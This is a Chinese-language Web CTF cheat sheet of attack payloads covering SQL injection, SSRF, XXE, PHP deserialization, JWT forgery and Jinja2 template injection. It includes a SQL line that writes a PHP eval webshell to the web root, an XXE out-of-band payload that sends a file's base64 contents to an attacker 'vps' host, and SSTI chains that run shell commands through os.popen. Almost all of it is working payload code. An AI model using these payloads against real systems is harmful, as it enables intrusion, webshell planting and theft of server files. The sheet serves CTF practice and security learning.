# Web CTF 考点速查：SSRF / XXE / 反序列化 / JWT

---

## 📋 目录

1. [SQL注入速查](#一sql注入)
2. [SSRF 利用](#二ssrf)
3. [XXE 利用](#三xxe)
4. [PHP反序列化](#四php反序列化)
5. [JWT 攻击](#五jwt)
6. [SSTI 模板注入](#六ssti)
7. [经典CTF题目](#七经典题目)

---

## 一、SQL注入

```sql
-- CTF常用速查

-- 1. 联合查询 → 判断列数
ORDER BY 3 -- 

-- 2. 查数据库
UNION SELECT 1,database(),3 -- 

-- 3. 查表名(MySQL)
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 

-- 4. 查列名
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='表名' -- 

-- 5. 没有回显 → 盲注
AND (SELECT ascii(substr(database(),1,1)))>100 -- 

-- 6. 写文件 GetShell
UNION SELECT 1,'<?php eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/shell.php' -- 

-- 7. 堆叠注入(多条语句)
;show tables; -- (select被过滤时)
;handler table_name open;handler table_name read first; -- (无select时)
;set @sql=0x53454c454354202a2046524f4d207573657273;prepare s from @sql;execute s; -- (预编译绕过过滤)
```

---

## 二、SSRF

```bash
# 1. URL 绕过
http://127.0.0.1/flag     → 过滤了！
http://0177.0.0.1/flag    → 八进制绕过 ✓
http://2130706433/flag     → 十进制绕过 ✓
http://0x7f000001/flag     → 十六进制绕过 ✓
http://127.0.0.1.xip.io/flag → DNS绕过 ✓

# 2. 302 跳转绕过
# 自己的服务器返回302 → http://127.0.0.1/admin

# 3. gopher 协议(内网攻击)
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# 4. dict 协议(端口探测)
dict://127.0.0.1:3306/

# 5. file 协议(读文件)
file:///flag
file:///etc/passwd
```

---

## 三、XXE

```xml
<!-- 基础 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>

<!-- 无回显 → OOB外带 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
  <!ENTITY % dtd SYSTEM "http://vps/evil.dtd"> %dtd;
]>
<root>1</root>

<!-- evil.dtd -->
<!ENTITY % a "<!ENTITY send SYSTEM 'http://vps/?%xxe;'>"> %a; %send;

<!-- CDATA绕过(无特殊字符时) -->
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % end "]]>">
  <!ENTITY all "%start;%file;%end;">
]>
<root>&all;</root>
```

---

## 四、PHP反序列化

```php
// CTF常见考法

// 1. 基础反序列化
$data = unserialize($_GET['data']);
echo $data;  // 触发 __toString

// 2. Phar反序列化(不直接调用unserialize!)
// include('phar://uploads/avatar.jpg')
// file_exists('phar://...')  → 也会触发!

// 3. POP链构造
class Start {
    public function __destruct() { $this->clean(); }
    public function clean() { eval($this->cmd); }
}
// Payload: O:5:"Start":1:{s:3:"cmd";s:10:"phpinfo();";}

// 4. 绕过 __wakeup
// 修改序列化字符串中的属性数量:
// O:5:"Start":2:{s:3:"cmd";s:10:"phpinfo();";}
// 实际只有1个属性，写2 → __wakeup被跳过!

// 5. 字符逃逸(反序列化字符串变长)
// 过滤函数: str_replace('x','yy',$data)
// "x" → "yy" (1字符变2字符)
// 利用: 计算差值 → 构造逃逸
```

---

## 五、JWT

```bash
# 1. 无签名 (alg:none)
{"alg":"none","typ":"JWT"}
{"user":"admin"}
.
# 去掉签名部分 → 直接发送!

# 2. 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt

# 3. 密钥泄露
# 常见: 公钥暴露 → RS256→HS256 混淆
jwt_tool.py <TOKEN> -X k -pk public.pem

# 4. kid注入
{"alg":"HS256","kid":"../../../../../etc/passwd"}
# → 服务器读取/etc/passwd作为密钥

# 5. 空密钥
{"alg":"HS256"} 密钥=""
```

---

## 六、SSTI

```python
# Flask/Jinja2 SSTI

# 1. 基础探测
{{7*7}}  # → 49 → SSTI确认

# 2. 读取配置
{{config}}

# 3. RCE 链
# 方法1: __class__.__mro__ 链
{{''.__class__.__mro__[1].__subclasses__()}}
# → 找到 <class 'subprocess.Popen'> 或其他可用类

# 方法2: lipsum
{{lipsum.__globals__['os'].popen('cat /flag').read()}}

# 方法3: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法4: joiner
{{joiner.__init__.__globals__.os.popen('cat /flag').read()}}

# 过滤绕过:
# . → |attr()
# [] → |attr()
# {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
```

---

## 七、经典题目

```
CTF Web 经典题型汇总:

PHP:
  ✦ 弱类型比较 (md5碰撞 0e开头)
  ✦ 反序列化 POP Chain
  ✦ preg_replace /e RCE
  ✦ extract 变量覆盖
  ✦ 文件包含 + php://filter

Java:
  ✦ Fastjson 反序列化
  ✦ Shiro RememberMe RCE
  ✦ JNDI 注入
  ✦ Spring Boot Actuator 信息泄露

Node.js:
  ✦ 原型链污染 (CVE-2019-10744等)
  ✦ ejs/eval 注入
  ✦ vm2 沙箱逃逸

Python:
  ✦ Flask SSTI
  ✦ pickle 反序列化
  ✦ yaml.load RCE

Go:
  ✦ template SSTI
  ✦ SSRF
```

---

## ✅ CheckList

- [ ] SQL注入: Union/Boolean/Time/堆叠
- [ ] SSRF: IP格式绕过/gopher/file
- [ ] XXE: 读文件/OOB外带/CDATA
- [ ] PHP反序列化: POP链/Phar/wakeup绕过
- [ ] JWT: none/爆破/混淆/kid
- [ ] SSTI: Flask/Jinja2 RCE链
